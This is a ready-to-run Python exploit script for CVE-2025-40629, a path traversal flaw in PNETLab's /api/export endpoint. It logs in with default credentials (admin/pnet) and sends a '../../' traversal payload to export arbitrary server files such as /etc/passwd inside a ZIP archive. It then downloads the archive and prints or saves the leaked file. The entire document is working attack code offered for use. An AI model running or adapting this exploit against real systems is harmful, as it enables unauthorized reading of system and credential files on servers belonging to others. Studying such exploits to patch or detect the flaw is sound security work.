#!/usr/bin/env python3
"""
CVE-2025-40629 - PNETLab Authenticated Path Traversal Exploit

@omr00t
"""
import argparse, io, os, sys, zipfile
from urllib.parse import urljoin, unquote
import requests

DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "pnet"

class C:
    G = "\033[92m"; R = "\033[91m"; B = "\033[94m"; Y = "\033[93m"; E = "\033[0m"

DEBUG = False

def info(msg):   print(f"{C.B}[*]{C.E} {msg}")
def ok(msg):     print(f"{C.G}[+]{C.E} {msg}")
def err(msg):    print(f"{C.R}[-]{C.E} {msg}")
def warn(msg):   print(f"{C.Y}[!]{C.E} {msg}")
def dbg(msg):    
    if DEBUG: print(f"{C.Y}[D]{C.E} {msg}")

class PNETClient:
    def __init__(self, base_url, proxies=None, timeout=10):
        self.base_url = base_url.rstrip("/")
        self.proxies = proxies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
        })

    def _sync_xsrf(self):
        xs = self.session.cookies.get("XSRF-TOKEN")
        if xs:
            self.session.headers["X-XSRF-TOKEN"] = unquote(xs)

    def _url(self, path): return urljoin(self.base_url + "/", path)

    def request(self, method, path, **kw):
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("proxies", self.proxies)
        self._sync_xsrf()
        url = self._url(path)
        dbg(f"{method} {url}")
        if "params" in kw and kw["params"]:
            dbg(f"params={kw['params']}")
        if "json" in kw and kw["json"] is not None:
            dbg(f"json={kw['json']}")
        r = self.session.request(method, url, **kw)
        dbg(f"status={r.status_code}")
        self._sync_xsrf()
        return r

    def get(self, path, **kw):  return self.request("GET", path, **kw)
    def post(self, path, **kw): return self.request("POST", path, **kw)

def authenticate(client, username, password):
    info(f"Authenticating as {username}...")
    try:
        client.get("")  # seed cookies / xsrf
    except requests.RequestException as e:
        err(f"Initial connection error: {e}")
        return None

    payload = {"username": username, "password": password, "html": "0"}
    try:
        r = client.post("/store/public/auth/login/login", json=payload)
    except requests.RequestException as e:
        err(f"Auth error: {e}")
        return None

    dbg(f"login body={r.text[:400]!r}")
    if not (200 <= r.status_code < 300):
        msg = None
        try:
            data = r.json()
            msg = data.get("message") or data.get("error")
            dbg(f"login json={data}")
        except Exception:
            pass
        err(f"Authentication failed: HTTP {r.status_code}")
        if msg: err(f"Error: {msg}")
        return None

    try:
        data = r.json()
        dbg(f"login json={data}")
        if isinstance(data, dict) and data.get("result") is False:
            err("Authentication failed: result=false")
            if data.get("message"): err(f"Message: {data['message']}")
            return None
    except ValueError:
        dbg("login response not JSON; relying on cookie")

    token = client.session.cookies.get("token")
    dbg(f"cookies={dict(client.session.cookies)}")
    if not token:
        err("Authentication failed: no 'token' cookie")
        return None

    ok("Authentication successful")
    dbg(f"token={token}")
    return token

def find_valid_lab(client, token):
    info("Looking for a valid lab file...")
    cookies = {"token": token}
    for path in ["/", "/Your labs from PNETLab Store"]:
        try:
            r = client.get("/api/folders", params={"path": path}, cookies=cookies)
        except requests.RequestException as e:
            dbg(f"folders error for {path}: {e}")
            continue
        if r.status_code != 200:
            dbg(f"{path} -> HTTP {r.status_code}")
            continue
        try:
            data = r.json()
        except ValueError:
            dbg(f"folders non-JSON for {path}")
            continue
        dbg(f"folders[{path}]={data}")
        if data.get("status") == "success":
            labs = data.get("data", {}).get("labs", [])
            if labs:
                lab_path = labs[0]["path"]
                ok(f"Using lab: {lab_path}")
                return lab_path
    warn("No lab found, using dummy path")
    return "/dummy.unl"

def exploit(client, token, target_file, lab):
    info(f"Requesting file: {target_file}")
    cookies = {"token": token}
    traversal = f"/Your labs from PNETLab Store/../../../../../../../../{target_file.lstrip('/')}"
    payload = {"path": "/", "0": lab, "1": traversal}
    try:
        r = client.post("/api/export", json=payload, cookies=cookies,
                        headers={"Content-Type": "application/json"}, timeout=30)
    except requests.RequestException as e:
        err(f"Export error: {e}")
        return None

    try:
        data = r.json()
    except ValueError:
        dbg(f"export raw={r.text[:400]!r}")
        err("Export failed: non-JSON response")
        return None

    dbg(f"export json={data}")
    if r.status_code != 200 or data.get("status") != "success":
        err(f"Export failed: HTTP {r.status_code}, msg={data.get('message')}")
        return None

    export_path = data.get("data")
    if not export_path:
        err("Export failed: no export path in response")
        return None
    ok(f"Exported ZIP path: {export_path}")
    return export_path

def download_and_extract(client, token, export_path, target_file):
    info("Downloading ZIP...")
    cookies = {"token": token}
    try:
        r = client.get(export_path, cookies=cookies, timeout=30)
    except requests.RequestException as e:
        err(f"Download error: {e}")
        return None

    dbg(f"download ct={r.headers.get('Content-Type')}, len={len(r.content)}")
    if r.status_code != 200:
        err(f"Download failed: HTTP {r.status_code}")
        return None

    ok(f"ZIP downloaded ({len(r.content)} bytes)")
    try:
        zf = zipfile.ZipFile(io.BytesIO(r.content), "r")
    except zipfile.BadZipFile:
        err("Invalid ZIP received")
        dbg(f"first100={r.content[:100].hex()}")
        return None

    names = zf.namelist()
    dbg(f"zip files={names}")
    target_basename = os.path.basename(target_file)
    target_in_zip = None
    for name in names:
        if target_file.lstrip("/") in name or name.endswith(target_basename):
            target_in_zip = name
            break
    if not target_in_zip:
        err("Target file not found in ZIP")
        warn("ZIP contents:")
        for n in names: print(f"  {n}")
        return None

    ok(f"Found in ZIP as: {target_in_zip}")
    data = zf.read(target_in_zip)
    dbg(f"extracted size={len(data)}")
    return data

def main():
    global DEBUG
    p = argparse.ArgumentParser(
        description="PNETLab /api/export authenticated path traversal (CVE-2025-40629)"
    )
    p.add_argument("-u", "--url", required=True, help="Target base URL")
    p.add_argument("-f", "--file", required=True, help="File to read (e.g. /etc/passwd)")
    p.add_argument("-U", "--username", default=DEFAULT_USERNAME)
    p.add_argument("-P", "--password", default=DEFAULT_PASSWORD)
    p.add_argument("-o", "--output", help="File to save leaked content")
    p.add_argument("--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()

    DEBUG = args.debug
    requests.packages.urllib3.disable_warnings()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
    if args.proxy: info(f"Proxy: {args.proxy}")

    base_url = args.url.rstrip("/")
    print(f"{C.G}Target:{C.E} {base_url}")
    print(f"{C.G}File:  {C.E} {args.file}")

    client = PNETClient(base_url, proxies=proxies)

    token = authenticate(client, args.username, args.password)
    if not token:
        err("Stopping: authentication failed")
        sys.exit(1)

    lab = find_valid_lab(client, token)
    export_path = exploit(client, token, args.file, lab)
    if not export_path:
        err("Stopping: export failed")
        sys.exit(1)

    content = download_and_extract(client, token, export_path, args.file)
    if not content:
        err("Stopping: could not retrieve file content")
        sys.exit(1)

    print(f"\n{C.G}[+] File content retrieved{C.E}\n" + "-" * 60)
    try:
        print(content.decode("utf-8", errors="replace"))
    except Exception:
        warn("Binary file, hex dump below:")
        print(content.hex())
    print("-" * 60)

    if args.output:
        with open(args.output, "wb") as f:
            f.write(content)
        ok(f"Saved to {args.output}")

if __name__ == "__main__":
    main()
